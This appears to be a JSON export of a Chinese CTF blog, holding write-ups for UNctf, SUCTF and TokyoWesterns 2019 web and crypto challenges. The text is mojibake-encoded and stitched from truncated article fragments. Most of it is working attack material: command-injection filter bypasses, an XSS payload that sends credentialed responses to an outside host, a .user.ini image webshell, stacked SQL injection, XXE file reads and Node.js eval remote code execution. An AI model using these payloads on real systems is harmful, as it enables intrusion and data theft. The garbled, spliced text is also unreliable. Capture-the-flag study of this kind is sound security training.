{"name":"wp","slug":"wp","count":2,"postlist":[{"title":"UNctf èµ›åå›é¡¾","slug":"unctf","date":"2019-11-20T01:26:49.000Z","updated":"2019-12-01T12:59:49.886Z","comments":true,"path":"api/articles/unctf.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"UNctf-èµ›åå›é¡¾\"><a href=\"#UNctf-èµ›åå›é¡¾\" class=\"headerlink\" title=\"UNctf èµ›åå›é¡¾\"></a>UNctf èµ›åå›é¡¾</h1><h2 id=\"bypass\"><a href=\"#bypass\" class=\"headerlink\" title=\"bypass\"></a>bypass</h2><p>é¢˜ç›®æºç ï¼š</p>\n<pre><code>&lt;?php\n    highlight_file(__FILE__);\n    $a = $_GET[&apos;a&apos;];\n    $b = $_GET[&apos;b&apos;];\n // try bypass it\n    if (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))\n        $a = &quot;&quot;;\n        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    if (preg_match(&quot;/\\&apos;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))\n        $b = &quot;&quot;;\n        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;\n     $cmd = &quot;file $a $b&quot;;\n      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); \n     system($cmd);\n?&gt;</code></pre><h3 id=\"one-way\"><a href=\"#one-way\" class=\"headerlink\" title=\"one way\"></a>one way</h3><p>æ­£åˆ™é»‘åå•åŒ¹é…ï¼Œå¯¹è¾“å…¥çš„å‚æ•°å¼ºåˆ¶åŠ ä¸ŠåŒå¼•å·ï¼Œå³ä½¿æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ä¹Ÿä¼šè¢«åŠ ä¸ŠåŒå¼•å·æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œç”¨åˆ°äº†åå¼•å· ```</p>\n<p>è§‚å¯Ÿç¬¬ä¸€ä¸ªæ­£åˆ™ `\\|`` ä¸‰ä¸ªåæ–œæ æ‰èƒ½è½¬ä¹‰åæ–œæ ï¼Œè¿™é‡Œå¯¹ | è¿›è¡Œäº†è½¬ä¹‰ä»è€Œé€ æˆåå¼•å·é€ƒé€¸ã€‚</p>\n<pre><code>&lt;?php\n$a = &quot;`dir`&quot;;\nif (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`/is&quot;,$a))\n    $a = &quot;&quot;;\n    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    var_dump($a);\n\nstring(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>å¯ä»¥çœ‹åˆ°åå¼•å·æˆåŠŸé€ƒé€¸ã€‚</p>\n<p>æˆ‘ä»¬åˆ°é¢˜ç›®ä¸­å°è¯•åˆ—ç›®å½•ï¼Œæ²¡æœ‰ <code>ls</code> å¯ä»¥ç”¨ <code>dir</code></p>\n<pre><code>?a=`dir%20/`\n\nå“åº”ï¼š\n\nbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\\011mnt proc run\\011 srv\\011 sys\\011usr\\012boot etc lib\\011 media\\011opt root sbin start.sh tmp\\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>æŸ¥æ‰¾flag </p>\n<pre><code>?a=`/b??/gr??%20-R%20unctf`\n\nå“åº”ï¼š\n.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h2><p>ç¬¬äºŒä¸ªæ­£åˆ™ <code>\\\\|\\n</code> ä¼šè§£é‡Šä¸ºç«–çº¿å’Œæ¢è¡Œï¼Œæ‰€ä»¥åˆ©ç”¨ <code>%0a</code> è¿›è¡Œæ¢è¡Œç»•è¿‡ï¼ŒåŒæ—¶æœ«å°¾ä½¿ç”¨ <code>%20#</code> æ¥ç»ˆæ­¢å‘½ä»¤å¤„ç†åŒå¼•å·</p>\n<pre><code>?a=\\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23\næ•ˆæœæ˜¯\nfile&quot;\\&quot;&quot;\n/???/gr?p -R ctf #&quot;</code></pre><h2 id=\"easy-xss\"><a href=\"#easy-xss\" class=\"headerlink\" title=\"easy xss\"></a>easy xss</h2><p>åœ¨ç•™è¨€æ¿å¤„æäº¤ xss å‘ç°èƒ½å¤Ÿè§¦å‘ï¼Œè®¿é—®å‚¨å­˜çš„è·¯å¾„å‘ç°ä¸€ä¸ªæ¥å£</p>\n<pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>æ­¤æ—¶çš„è¯·æ±‚å¤´é‡Œå¸¦ä¸Šäº† <code>XMLHttpRequest</code> ï¼ŒåŒæ—¶ä¸å¸¦å‚æ•°è®¿é—®æ—¶å¾—åˆ° debug é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° XHRè¯·æ±‚å¸¦ä¸Šäº† cookie ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€  XHR è¯·æ±‚</p>\n<pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new\nXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;\nxmlhttp.responseText.match(&apos;flag\\\\{(.\\*?)\\\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\\&gt;</code></pre><h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>æŸ¥çœ‹æºç å‘ç°å„ä¸ªæ¥å£</p>\n<pre><code>      switch (e.cmd) {\n        case &apos;name&apos;:\n          this.nickname = e.msg,\n          this.kesshoubanMsg(`Change nickname ${this.nickname\n        }\n         success!`);\n        break;\n      case &apos;error&apos;:\n        this.kesshoubanMsg(`ğŸ™${e.msg\n    }\n    `);\n    break;\n  case &apos;calc&apos;:\n    this.kesshoubanMsg(`${e.msg\n  }\n  `);\n  break;\ncase &apos;flag&apos;:\n  this.kesshoubanMsg(`${e.msg\n}\n`);</code></pre><p>ä¿®æ”¹å®Œåå­—åæµ‹è¯• <code>/calc 1+1</code> å‘ç°æˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨ä»£ç æ³¨å…¥å‚è€ƒ<a href=\"http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\" target=\"_blank\" rel=\"noopener\">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>\n<p>å°è¯• <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> å…¶ä¸­ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ $IFS ï¼ŒåŒæ—¶Syncé‡‡ç”¨éé˜»å¡è¿”å›ã€‚</p>\n","text":"UNctf èµ›åå›é¡¾bypassé¢˜ç›®æºç ï¼š&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    i","link":"","raw":null,"photos":[],"categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"},{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"De1ctf","slug":"De1ctf","date":"2019-08-16T12:00:50.000Z","updated":"2019-09-03T14:24:23.083Z","comments":true,"path":"api/articles/De1ctf.json","excerpt":"<p>è¿™æ¬¡æ¯”èµ›çœŸçš„è¶…æœ‰æ„æ€çš„ï¼æˆ‘è¶…çº§å–œæ¬¢çš„ï¼åšäº†åŠå¤©å•¥éƒ½æ²¡åšå‡ºæ¥ï¼Œçœ‹ç€é‚£ä¸ªæ¨±èŠ±ğŸŒ¸å…¨ç¨‹é™¶é†‰~</p>","keywords":null,"cover":null,"content":null,"text":"è¿™æ¬¡æ¯”èµ›çœŸçš„è¶…æœ‰æ„æ€çš„ï¼æˆ‘è¶…çº§å–œæ¬¢çš„ï¼åšäº†åŠå¤©å•¥éƒ½æ²¡åšå‡ºæ¥ï¼Œçœ‹ç€é‚£ä¸ªæ¨±èŠ±ğŸŒ¸å…¨ç¨‹é™¶é†‰~De1ctf 2019 WPssrfmeæºç  #! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask imp","link":"","raw":null,"photos":[],"categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"},{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]}]}®æœ‰<code>index.php</code>å¯ä»¥åˆ©ç”¨ï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹å§ğŸˆ</p>\n<h3 id=\"å¼€å§‹ä¸Šä¼ \"><a href=\"#å¼€å§‹ä¸Šä¼ \" class=\"headerlink\" title=\"å¼€å§‹ä¸Šä¼ \"></a>å¼€å§‹ä¸Šä¼ </h3><p>æˆ‘ä»¬å…ˆæ„é€ <code>.user.ini</code>æ–‡ä»¶</p>\n<pre><code>GIF89a\nauto_prepend_file=CK.jpg</code></pre><p>ç„¶åå°†å…¶ä¸Šä¼ </p>\n<p>æ¥ç€æ„é€ å›¾ç‰‡é©¬<code>CK.jpg</code></p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    system(&apos;cat /flag&apos;);\n&lt;/script&gt;</code></pre><p>æˆåŠŸä¸Šä¼ ä¹‹åæˆ‘ä»¬è®¿é—®ä¸Šä¼ åçš„é¡µé¢å³å¯çœ‹åˆ°flagã€‚</p>\n<h2 id=\"easy-sql\"><a href=\"#easy-sql\" class=\"headerlink\" title=\"easy sql\"></a>easy sql</h2><p>å­˜åœ¨å †å æ³¨å…¥ï¼Œæµ‹è¯•<code>1;show tables;</code>å›æ˜¾</p>\n<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>æµ‹è¯•<code>1;select * from Flag;</code>,flagè¢«è¿‡æ»¤äº†</p>\n<p><code>.index.php.swp</code>å­˜åœ¨æºç æ³„éœ²,æºç å¦‚ä¸‹  </p>\n<pre><code>&lt;?php\n    session_start();\n\n    include_once &quot;config.php&quot;;\n\n    $post = array();\n    $get = array();\n    global $MysqlLink;\n\n    //GetPara();\n    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);\n    if(!$MysqlLink){\n        die(&quot;Mysql Connect Error!&quot;);\n    }\n    $selectDB = mysqli_select_db($MysqlLink,$dataName);\n    if(!$selectDB){\n        die(&quot;Choose Database Error!&quot;);\n    }\n\n    foreach ($_POST as $k=&gt;$v){\n        if(!empty($v)&amp;&amp;is_string($v)){\n            $post[$k] = trim(addslashes($v));\n        }\n    }\n    foreach ($_GET as $k=&gt;$v){\n        }\n    }\n    //die();\n    ?&gt;\n\n&lt;html&gt;\n&lt;head&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;\n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;\n&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;\n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&lt;?php\n\n    if(isset($post[&apos;query&apos;])){\n        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;;\n        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));\n        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){\n            //echo $post[&apos;query&apos;];\n            die(&quot;Nonono.&quot;);\n        }\n        if(strlen($post[&apos;query&apos;])&gt;40){\n            die(&quot;Too long.&quot;);\n        }\n        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;\n        mysqli_multi_query($MysqlLink,$sql);\n        do{\n            if($res = mysqli_store_result($MysqlLink)){\n                while($row = mysqli_fetch_row($res)){\n                    print_r($row);\n                }\n            }\n        }while(@mysqli_next_result($MysqlLink));\n\n    }\n\n    ?&gt;</code></pre><p>æŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>\n<h3 id=\"logical-OR\"><a href=\"#logical-OR\" class=\"headerlink\" title=\"|| logical OR\"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;\n        -&gt; 1\nmysql&gt; SELECT 1 OR 0;\n        -&gt; 1\nmysql&gt; SELECT 0 OR 0;\n        -&gt; 0\nmysql&gt; SELECT 0 OR NULL;\n        -&gt; NULL\nmysql&gt; SELECT 1 OR NULL;\n        -&gt; 1</code></pre><blockquote>\n<p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p>\n</blockquote>\n<h3 id=\"å¦‚ä½•åšï¼Ÿ\"><a href=\"#å¦‚ä½•åšï¼Ÿ\" class=\"headerlink\" title=\"å¦‚ä½•åšï¼Ÿ\"></a>å¦‚ä½•åšï¼Ÿ</h3><p>å…ˆæ¥çœ‹ä¸€ä¸ªmsqlçš„é…ç½®</p>\n<p><strong>PIPES_AS_CONCAT</strong></p>\n<blockquote>\n<p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p>\n</blockquote>\n<p>å¦‚æœé…ç½®äº†<code>sql_mode=PIPES_AS_CONCAT</code>ï¼ŒMysqlä¼šæŠŠé€»è¾‘æˆ–å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²é“¾æ¥å‡½æ•°å¯¹å¾…ã€‚  </p>\n<p><strong>CONCAT(str1,str2,â€¦)</strong></p>\n<blockquote>\n<p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p>\n</blockquote>\n<p><code>CONCAT()</code> returns NULL if any argument is NULL. </p>\n<pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);\n        -&gt; &apos;MySQL&apos;\nmysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);\n        -&gt; NULL\nmysql&gt; SELECT CONCAT(14.3);\n        -&gt; &apos;14.3&apos;</code></pre><p>æˆ‘ä»¬é€šè¿‡<code>sql_mode=PIPES_AS_CONCAT</code>æ¥å°†flagå¸¦å‡ºæ¥</p>\n<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p>\n<p>è¯­å¥ä¸º:</p>\n<pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id=\"éé¢„æœŸ\"><a href=\"#éé¢„æœŸ\" class=\"headerlink\" title=\"éé¢„æœŸ\"></a>éé¢„æœŸ</h3><p>payload:<code>*,1</code>æ„é€ <code>select *,1 || flag from Flag;</code> å³å¯æŸ¥å‡ºå…¨éƒ¨å†…å®¹ã€‚</p>\n","text":"SUCTF-2019 WP9/10/2019 6:15:38 PM checkinå…ˆä¸Šä¼ ä¸€ä¸ª websell.phpï¼Œæ˜¾ç¤ºåç¼€ä¸åˆæ³•(æ”¹php5ã€php4ã€content-typeè¿™äº›éƒ½ä¸è¡Œ)ã€‚å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬å‘ç°æ˜¾ç¤º &amp;lt;? in contents! ï¼Œå°±æ˜¯è¯´&lt","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"HITCON-babytrick","slug":"HITCON-Babytrick","date":"2018-03-23T07:13:47.000Z","updated":"2019-08-01T11:50:29.876Z","comments":true,"path":"api/articles/HITCON-Babytrick.json","excerpt":"<p>too hard</p>","keywords":null,"cover":null,"content":null,"text":"too hardHITCON-babytrick##0x01 éœ€è¦æ³¨æ„çš„ç‚¹ ##phpååºåˆ—åŒ–ç®€å•çš„æ³¨å…¥å­—ç¬¦é›†ç»•è¿‡0x02 æºç åˆ†æindex.phpæºç &lt;?phpinclude &quot;config.php&quot;;class HITCON{private $me","link":"","raw":null,"photos":[],"categories":[{"name":"WP","slug":"WP","count":7,"path":"api/categories/WP.json"}],"tags":[{"name":"WP","slug":"WP","count":5,"path":"api/tags/WP.json"},{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"},{"name":"SQL","slug":"SQL","count":4,"path":"api/tags/SQL.json"}]},{"title":"TokyoWestern 2019","slug":"TokyoWesterns-2019","date":"2019-09-05T09:20:26.000Z","updated":"2019-09-11T04:43:53.977Z","comments":true,"path":"api/articles/TokyoWesterns-2019.json","excerpt":"","keywords":null,"cover":"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg","content":"<h1 id=\"TokyoWestern-2019\"><a href=\"#TokyoWestern-2019\" class=\"headerlink\" title=\"TokyoWestern 2019\"></a>TokyoWestern 2019</h1><p>9/5/2019 5:20:26 PM ğŸ¨</p>\n<h2 id=\"ji2xji2\"><a href=\"#ji2xji2\" class=\"headerlink\" title=\"ji2xji2\"></a>ji2xji2</h2><p>æ‹¿åˆ°é¢˜ç›®ç¬¬ä¸€ååº”å°±æ˜¯XXEï¼Œç›´æ¥æ‹¿ç€ä¹‹å‰åšå®¢çš„payloadä¸€é¡¿è¯•ï¼Œç»“æœå¾—åˆ°äº†<code>failed to decode xml</code>ï¼Œç„¶åå°±åœ¨æƒ³æ˜¯ä¸æ˜¯æ€è·¯é”™äº†ï¼Œæ²¡æƒ³åˆ°æ˜¯è¯»çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œå…¶å®æ‹¿æœ€ç®€å•çš„</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;\n&lt;creds&gt;\n&lt;user&gt;&amp;xxe;&lt;/user&gt;\n&lt;pass&gt;mypass&lt;/pass&gt;\n&lt;/creds&gt;</code></pre><p>å°±èƒ½çœ‹å‡ºæ¥å¯ä»¥è§£æï¼Œå› ä¸ºè§‰å¾—ä¸å¯èƒ½è¿™ä¹ˆç®€å•å°±æ²¡æœ‰è¯•â€¦</p>\n<p>è¯»æºç </p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>è¿™é‡Œæˆ‘ä»¬è¦æ³¨æ„å¾—åˆ°çš„åŠ å¯†åçš„æ•°æ®åœ¨å“ªé‡Œç»“æŸ</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6cdqqvj31d60dmwj2.jpg\" alt=\"è¯»æºç \"></p>\n<p>å¾—åˆ°æºç ï¼Œä»ç¬¬ä¸€å¥å¾—åˆ°<strong>flag</strong>çš„ä½ç½®</p>\n<pre><code>&lt;?php\n**include &apos;flag.php&apos;;**\n\n$method = $_SERVER[&apos;REQUEST_METHOD&apos;];\n\nfunction die404($msg) {\n  http_response_code(404);\n  die($msg);\n}\n\nfunction check_type($obj) {\n  if (is_array($obj)) {\n    $key_is_str = function($obj) {\n      foreach($obj as $key=&gt;$val) {\n        if (is_int($key))\n          return false;\n      }\n      return true;\n    };\n\n    if ($key_is_str($obj)) {\n      return &apos;object&apos;;\n    }\n    else {\n      return &apos;array&apos;;\n    }\n  }\n  else {\n    return gettype($obj);\n  }\n}\n\nfunction json2xml($obj) {\n  $res = &apos;&apos;;\n\n  if (is_array($obj)) {\n    foreach($obj as $key =&gt; $val) {\n      switch(check_type($val)) {\n        case &apos;array&apos;:\n          foreach($val as $v) {\n            $res .= &quot;&lt;$key&gt;&quot;;\n            $res .= json2xml($v);\n            $res .= &quot;&lt;/$key&gt;&quot;;\n          }\n          break;\n        default: // object or primitive\n          $res .= &quot;&lt;$key&gt;&quot;;\n          $res .= json2xml($val);\n          $res .= &quot;&lt;/$key&gt;&quot;;\n          break;\n      }\n    }\n  }\n  else {\n    $res = (string)$obj;\n  }\n  return $res;\n}\n\n\nif ($method === &apos;POST&apos;) {\n  $jsonstr = $_POST[&apos;json&apos;];\n  $xmlstr = $_POST[&apos;xml&apos;];\n\n  if (!(empty($xmlstr) ^ empty($jsonstr))) {\n    die404(&apos;404&apos;);\n  }\n\n  if (!empty($jsonstr)) {\n    $obj = json_decode($jsonstr, true);\n    if (empty($obj)) {\n      die(&apos;failed to decode json&apos;);\n    }\n    $doc = new DOMDocument(&apos;1.0&apos;);\n    $doc-&gt;formatOutput = true;\n    $_obj = array();\n    $_obj[&apos;root&apos;] = $obj;\n    $doc-&gt;loadXML(json2xml($_obj));\n    echo $doc-&gt;saveXML();\n  }\n\n  if (!empty($xmlstr)) {\n    libxml_disable_entity_loader(false);\n    $obj = simplexml_load_string($xmlstr, &apos;SimpleXMLElement&apos;, LIBXML_NOENT);\n    if (empty($obj)) {\n      die(&apos;failed to decode xml&apos;);\n    }\n    echo json_encode($obj, JSON_PRETTY_PRINT);\n  }\n}\nelse {\n?&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;JSON &lt;-&gt; XML Converter&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;textarea id=&quot;json&quot; name=&quot;json&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;\n    &lt;/textarea&gt;\n\n    &lt;input type=&quot;button&quot; id=&quot;x2j&quot; value=&quot;&lt;-&quot;/&gt;\n    &lt;input type=&quot;button&quot; id=&quot;j2x&quot; value=&quot;-&gt;&quot;/&gt;\n\n    &lt;textarea id=&quot;xml&quot; name=&quot;xml&quot; rows=&quot;50&quot; cols=&quot;80&quot;&gt;\n    &lt;/textarea&gt;\n\n    &lt;script\n      src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;\n      integrity=&quot;sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=&quot;\n      crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;\n    &lt;script&gt;\n      $.get(&apos;/sample.json&apos;, function(data) {\n        $(&apos;#json&apos;).val(data);\n      }, &apos;text&apos;);\n\n      $(&apos;#j2x&apos;).on(&apos;click&apos;, function() {\n        $.post(&apos;/&apos;, {\n          json: $(&apos;#json&apos;).val()\n        }, function(data) {\n          $(&apos;#xml&apos;).val(data);\n        });\n      });\n\n      $(&apos;#x2j&apos;).on(&apos;click&apos;, function() {\n        $.post(&apos;/&apos;, {\n          xml: $(&apos;#xml&apos;).val()\n        }, function(data) {\n          $(&apos;#json&apos;).val(data);\n        });\n      });\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</code></pre><p>è¯»flag</p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ENTITY hacker SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.php&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>è§£å¯†å³å¯<br>    {<br>        â€œmessageâ€: â€œPD9waHAKJGZsYWcgPSAnVFdDVEZ7dDFueV9YWEVfc3QxbGxfZXgxc3RzX2V2ZXJ5d2hlcmV9JzsKâ€<br>    }</p>\n<pre><code>$flag = &apos;TWCTF{t1ny_XXE_st1ll_ex1sts_everywhere}&apos;;</code></pre><h2 id=\"real-baby-rsa\"><a href=\"#real-baby-rsa\" class=\"headerlink\" title=\"real-baby-rsa\"></a>real-baby-rsa</h2><p>å‘Šè¯‰äº†æˆ‘ä»¬N,eä»¥åŠæ‰€æœ‰åŠ å¯†åçš„å¯†æ–‡ï¼Œç›´æ¥çˆ†ç ´ã€‚(åšçš„æ—¶å€™åˆæ˜¯é‚£æ ·æƒ³çš„ï¼šæ€ä¹ˆå¯èƒ½è¿™ä¹ˆç®€å•ï¼(è¿™ä¹ˆç®€å•å¼€å§‹çš„æ—¶å€™è¿˜ä¸çŸ¥é“æ›¿æ¢æ‰æ¢è¡Œç¬¦ï¼Œæäº†åŠå¤©æ²¡åšæˆğŸ˜”(ï¼›â€²âŒ’`)))</p>\n<pre><code>#flag = &apos;TWCTF{CENSORED}&apos;\n#print(flag)\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\n\n# Encrypt the flag!\n\n#for i in flag1:\nfor char in flag:\n    print(pow(ord(char), e, N))</code></pre><p>è§£å¯†è„šæœ¬ï¼š</p>\n<pre><code>import string\n#flag = &apos;TWCTF{CENSORED}&apos;\n\nflag = string.letters+string.digits+&quot;!@#$%^&amp;*()/{}_&quot;\n#print(flag)\n# Public Parameters\nN = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\ncontent = open(&quot;output&quot;).readlines()\n\nfor line in content:\n    line = line.replace(&apos;\\n&apos;, &apos;&apos;)\n    for char in flag:\n        #print char\n        #print(pow(ord(char), e, N))\n        m = pow(ord(char), e, N)\n        #print(m)\n        #print(line)\n        if str(m) == str(line):\n            #print(m)\n            print(char),\n            break</code></pre><p>å†è´´ä¸€ä¸ªå›½å¤–å¸ˆå‚…å†™çš„ï¼Œçœ‹èµ·æ¥å°±æ˜¯æ¯”ä¸Šé¢çš„ä¼˜é›…ä¸€ç‚¹ğŸ˜€ï¼Œåˆ«é—®ä¸ºä»€ä¹ˆè´´ä¸¤ä¸ªï¼Ÿé—®å°±æ˜¯å–œæ¬¢æ”¶é›†ï¼</p>\n<pre><code>N = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091\ne = 65537\n\n#create ist ascii char\nlist_ascii = []\nfor i in range(33,126):\n    list_ascii.append(chr(i))\n\n#read each part of cipher text in to list\nlineList = list()\nlineList = [line.rstrip(&apos;\\n&apos;) for line in open(&quot;output&quot;)]\n\n#starting burte force\n\nmesg = &quot;&quot;\n\nfor cir in range(0,len(lineList)):\n    for m in list_ascii:\n        test_str = pow(ord(m),e,N)\n        test_str = str(test_str)\n        if(lineList[cir] in test_str):\n            mesg += m\n            break\nprint(mesg)</code></pre><h2 id=\"php-note\"><a href=\"#php-note\" class=\"headerlink\" title=\"php-note\"></a>php-note</h2><pre><code>first name :1\nlastname: {{2*2}}</code></pre><p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g6vh6ett6fj30pe0d1wep.jpg\" alt=\"ç™»é™†æˆåŠŸ\"></p>\n<p>æŸ¥çœ‹æºç å¾—åˆ°hint:<code>http://phpnote.chal.ctf.westerns.tokyo/?action=source</code></p>\n<p>è¯»æºç </p>\n<pre><code> &lt;?php\ninclude 